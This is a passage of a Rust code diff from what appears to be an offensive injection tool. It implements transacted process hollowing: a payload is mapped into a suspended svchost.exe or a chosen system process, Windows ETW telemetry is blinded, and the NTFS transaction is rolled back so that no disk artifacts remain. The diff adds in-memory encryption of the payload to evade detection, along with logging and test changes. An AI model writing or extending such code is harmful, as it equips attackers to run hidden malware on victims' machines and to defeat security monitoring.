+    // that cleartext exists in user-space for the shortest possible window.
+    let guarded = encrypt_payload_in_transit(payload);
 
-    write_payload_to_section(h_section, &guarded_payload).map_err(|reason| {
-        let _ = crate::syscall!("NtClose", h_section as u64);
-        close_handle(tx.handle);
-        InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason,
-        }
-    })?;
+    // Decrypt right before the section write.  The plaintext Vec only
+    // exists for the duration of the write_payload_to_section call (which
+    // copies it into a local section mapping and then unmaps).  After the
+    // write the plaintext Vec is dropped and its memory zeroed.
+    {
+        let plaintext = guarded.decrypt_and_zero();
+        write_payload_to_section(h_section, &plaintext).map_err(|reason| {
+            let _ = crate::syscall!("NtClose", h_section as u64);
+            close_handle(tx.handle);
+            InjectionError::InjectionFailed {
+                technique: technique.clone(),
+                reason,
+            }
+        })?;
+        // plaintext goes out of scope here — Drop impl zeroes it
+    }
 
     // ── Step 4: Create suspended process ──────────────────────────────
-    let sacrificial_path = get_sacrificial_path();
+    let sacrificial_path = get_sacrificial_path(target_process);
     let target = create_suspended_process(&sacrificial_path).map_err(|reason| {
         let _ = crate::syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
@@ -1596,7 +2117,7 @@ pub unsafe fn inject_transacted_hollowing(
         }
     })?;
 
-    log::info!(
+    tracing::info!(
         "injection_transacted: created suspended process pid={}",
         target.pid
     );
@@ -1627,7 +2148,7 @@ pub unsafe fn inject_transacted_hollowing(
                 etw_ctx = Some(ctx);
             }
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "injection_transacted: ETW blinding failed (non-fatal): {}",
                     e
                 );
@@ -1659,7 +2180,7 @@ pub unsafe fn inject_transacted_hollowing(
             }
         })?;
 
-    log::debug!(
+    tracing::debug!(
         "injection_transacted: payload mapped at {:#x} in target pid={}",
         remote_base,
         target.pid
@@ -1690,10 +2211,10 @@ pub unsafe fn inject_transacted_hollowing(
     // the transaction are deleted — the on-disk artifacts never existed.
     match rollback_transaction(&tx) {
         Ok(()) => {
-            log::info!("injection_transacted: transaction rolled back — no disk artifacts");
+            tracing::info!("injection_transacted: transaction rolled back — no disk artifacts");
         }
         Err(e) => {
-            log::warn!(
+            tracing::warn!(
                 "injection_transacted: transaction rollback failed (non-fatal, payload already mapped): {}",
                 e
             );
@@ -1717,7 +2238,7 @@ pub unsafe fn inject_transacted_hollowing(
         }
     })?;
 
-    log::info!(
+    tracing::info!(
         "injection_transacted: injection complete — pid={}, base={:#x}",
         target.pid,
         remote_base
@@ -1748,17 +2269,26 @@ mod tests {
 
     #[test]
     fn test_page_align() {
+        let ps = crate::page_size::system_page_size();
         assert_eq!(page_align(0), 0);
-        assert_eq!(page_align(1), 4096);
-        assert_eq!(page_align(4096), 4096);
-        assert_eq!(page_align(4097), 8192);
+        assert_eq!(page_align(1), ps);
+        assert_eq!(page_align(ps), ps);
+        assert_eq!(page_align(ps + 1), ps * 2);
     }
 
     #[test]
-    fn test_get_sacrificial_path() {
-        let path = get_sacrificial_path();
+    fn test_get_sacrificial_path_default() {
+        let path = get_sacrificial_path(None);
         let path_str: String = String::from_utf16_lossy(&path[..path.len() - 1]);
         assert!(path_str.contains("svchost.exe"));
+    }
+
+    #[test]
+    fn test_get_sacrificial_path_override() {
+        let path = get_sacrificial_path(Some("notepad.exe"));
+        let path_str: String = String::from_utf16_lossy(&path[..path.len() - 1]);
+        assert!(path_str.contains("notepad.exe"));
+        assert!(path_str.contains(r"System32\notepad.exe"));
     }
 
     #[test]
